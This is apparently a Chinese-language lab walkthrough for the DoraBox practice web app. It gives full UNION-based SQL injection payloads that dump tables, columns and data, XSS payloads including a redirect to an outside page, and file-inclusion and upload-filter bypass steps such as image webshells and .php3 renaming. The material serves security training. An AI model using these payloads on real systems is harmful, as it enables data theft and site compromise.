# DoraBox

# Sql注入

## 第一关，sql注入数字型


源码中id是htmlspecialchars过滤的，过滤是过滤单引号，双引号，尖括号和&的，但是过滤的是html实体并不会影响我们的操作

![image-20220226143949141](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261439284.png)

### 1、测试参数位置

```
-1 union select 1,2,3
```



### (https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261440461.png)2、爆数据库：

```
-1 union select 1,user(),database()
```

![](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261441408.png)

### 3、爆表：

```
-1 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
```



### 4、爆列名：

```
-1 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='news'
```



### 5、爆值：

```
-1 UNION SELECT 1,2,concat_ws('|',id,title,content) from news
```

![image-20220226144410955](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261444010.png)

## 第二关，Sql注入字符型


这关和之前是差不多的，就是要闭合一下单引号即可

![image-20220226144539257](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261445380.png)

```
DoraBox' and '1'='2' union select 1,2,3'
```

![image-20220226144634958](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261446000.png)

### 爆表:

```
DoraBox' and '1'='2' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

![image-20220226144816563](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261448631.png)

### 爆列名:

```
DoraBox' and '1'='2' UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='news'#
```

![image-20220226144858626](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261448690.png)

### 爆值：

DoraBox' and '1'='2' UNION SELECT 1,2,concat_ws('|',id,title,content) from news#

![image-20220226144927164](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261449209.png)

## 第二关,Sql注入搜索型

这里百分号和单引号都需要闭合

![image-20220226145003517](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261450574.png)

### 爆表：

```
-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#
```



### 爆列：

```
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='pentest' and table_name='account'#
```



### 爆数据：

```
-1' union select 1,2,concat_ws(",",id,rest,own) from account#


```

# Xss跨站

## Xss反射型

```
<script>alert(/XSS/)</script>
```

源码里会打印内容

![image-20220226145148336](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261451412.png)

当然我们还可以在本地搭建一个xss

在网站上输入:

```
<script>location.href='http://www.test.com/xss/1.php'</script>
```



就会跳转到这个页面然后中了我们的xss代码



## Xss存储型

这个xss是存储到数据库里的，每次刷新当前页面都会执行

先输入`<script>alert(/XSS/)</script>`，然后刷新页面就会执行

![image-20220226145336767](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261453818.png)





## Xssdom型

输入`<script>alert(/DOM_xss/)</script>`

这里会打印我们的xss代码

![image-20220226145416778](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261454825.png)



# 文件包含

## 任意文件包含

直接输入 txt.txt包含文件

![image-20220226145747983](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261457151.png)

源码中，这里是直接包含的，中间没有过滤

## 目录限制文件包含

源码这里其实并没有限制目录文件包含

./点斜杠其实是指当前目录的意思，并没有起到限制的作用

![image-20220226150042838](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261500908.png)



# 文件上传

## 任意文件上传

这个页面上传什么文件都可以，不多介绍

![image-20220226150152450](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261501497.png)

![image-20220226150242135](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261502247.png)





## Js限制文件上传

直接限制了我们上传php文件

![image-20220226150339654](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261503784.png)

在上传处审计元素

这里只要把onsubmit直接删掉让js代码不起作用即可

![image-20220226150622397](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261506463.png)

## Mime限制上传

只要是这四种类型的mime都给上传，那我们直接抓包Content-Type改下即可

![image-20220226151403798](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261514885.png)

![](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261514350.png)

## 扩展名限制文件上传


这里源码中限制了一些后缀，我们把后缀改成php3即可

![](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261515642.png)



## 内容限制上传

这关可以直接用图片马来绕过

![image-20220226151806303](https://tobyjpghub-1258737888.cos.ap-shanghai.myqcloud.com/202202261518357.png)

